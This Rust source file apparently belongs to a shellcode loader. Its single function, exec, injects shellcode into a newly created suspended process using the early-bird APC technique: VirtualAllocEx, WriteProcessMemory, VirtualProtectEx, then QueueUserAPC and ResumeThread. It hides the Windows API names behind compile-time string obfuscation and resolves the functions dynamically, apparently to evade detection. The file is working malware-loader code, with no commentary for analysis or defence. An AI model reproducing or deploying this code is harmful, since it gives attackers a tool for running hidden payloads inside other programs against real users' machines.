pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), String> {
    use std::ffi::c_void;
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::ptr::{null, null_mut};
    use std::mem::transmute;
    use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED};
    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
    
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_virtual_alloc_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualAllocEx\0").as_slice())?;
    let p_virtual_protect_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtectEx\0").as_slice())?;
    let p_write_process_memory = get_proc_address(kernel32, obf_lit_bytes!(b"WriteProcessMemory\0").as_slice())?;
    let p_queue_user_apc = get_proc_address(kernel32, obf_lit_bytes!(b"QueueUserAPC\0").as_slice())?;
    let p_create_process_w = get_proc_address(kernel32, obf_lit_bytes!(b"CreateProcessW\0").as_slice())?;
    let p_resume_thread = get_proc_address(kernel32, obf_lit_bytes!(b"ResumeThread\0").as_slice())?;

    type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, u32) -> *mut c_void;
    type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *mut u32) -> i32;
    type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
    type QueueUserAPCFn = unsafe extern "system" fn(Option<unsafe extern "system" fn(usize)>, *mut c_void, usize) -> u32;
    type CreateProcessWFn = unsafe extern "system" fn(
        *const u16,
        *mut u16,
        *mut c_void,
        *mut c_void,
        i32,
        u32,
        *mut c_void,
        *const u16,
        *mut STARTUPINFOW,
        *mut PROCESS_INFORMATION,
    ) -> i32;
    type ResumeThreadFn = unsafe extern "system" fn(*mut c_void) -> u32;

    let virtual_alloc_ex: VirtualAllocExFn = transmute(p_virtual_alloc_ex);
    let virtual_protect_ex: VirtualProtectExFn = transmute(p_virtual_protect_ex);
    let write_process_memory: WriteProcessMemoryFn = transmute(p_write_process_memory);
    let queue_user_apc: QueueUserAPCFn = transmute(p_queue_user_apc);
    let create_process_w: CreateProcessWFn = transmute(p_create_process_w);
    let resume_thread: ResumeThreadFn = transmute(p_resume_thread);

    let p_close_handle = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
    type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
    let close_handle: CloseHandleFn = transmute(p_close_handle);

    let shellcode = std::slice::from_raw_parts(p as *const u8, size);

    let program_str = target_program;
    let mut program_w: Vec<u16> = program_str.encode_utf16().collect();
    program_w.push(0);

    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();
    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    startup_info.wShowWindow = 1;

    let ret = create_process_w(
        null(),
        program_w.as_mut_ptr(),
        null_mut(),
        null_mut(),
        1, // bInheritHandles
        CREATE_SUSPENDED,
        null_mut(),
        null(),
        &mut startup_info,
        &mut proc_info,
    );
    if ret == 0 {
        return Err(obf_lit!("CreateProcessW failed").to_string());
    }

    let addr = virtual_alloc_ex(
        proc_info.hProcess as *mut c_void,
        null(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if addr.is_null() {
        close_handle(proc_info.hProcess);
        close_handle(proc_info.hThread);
        return Err(obf_lit!("VirtualAllocEx failed").to_string());
    }

    let mut written = 0;
    let ret_write = write_process_memory(
        proc_info.hProcess as *mut c_void,
        addr,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut written,
    );
    if ret_write == 0 {
        close_handle(proc_info.hProcess);
        close_handle(proc_info.hThread);
        return Err(obf_lit!("WriteProcessMemory failed").to_string());
    }

    let mut old_protect = PAGE_READWRITE;
    let ret_protect = virtual_protect_ex(
        proc_info.hProcess as *mut c_void,
        addr,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );
    if ret_protect == 0 {
        close_handle(proc_info.hProcess);
        close_handle(proc_info.hThread);
        return Err(obf_lit!("VirtualProtectEx failed").to_string());
    }

    let apc_fn: unsafe extern "system" fn(usize) = transmute(addr);
    let ret_apc = queue_user_apc(Some(apc_fn), proc_info.hThread as *mut c_void, 0);
    if ret_apc == 0 {
        close_handle(proc_info.hProcess);
        close_handle(proc_info.hThread);
        return Err(obf_lit!("QueueUserAPC failed").to_string());
    }

    let ret_resume = resume_thread(proc_info.hThread as *mut c_void);
    if ret_resume == 0xFFFFFFFF {
        close_handle(proc_info.hProcess);
        close_handle(proc_info.hThread);
        return Err(obf_lit!("ResumeThread failed").to_string());
    }

    close_handle(proc_info.hProcess);
    close_handle(proc_info.hThread);

    Ok(())
}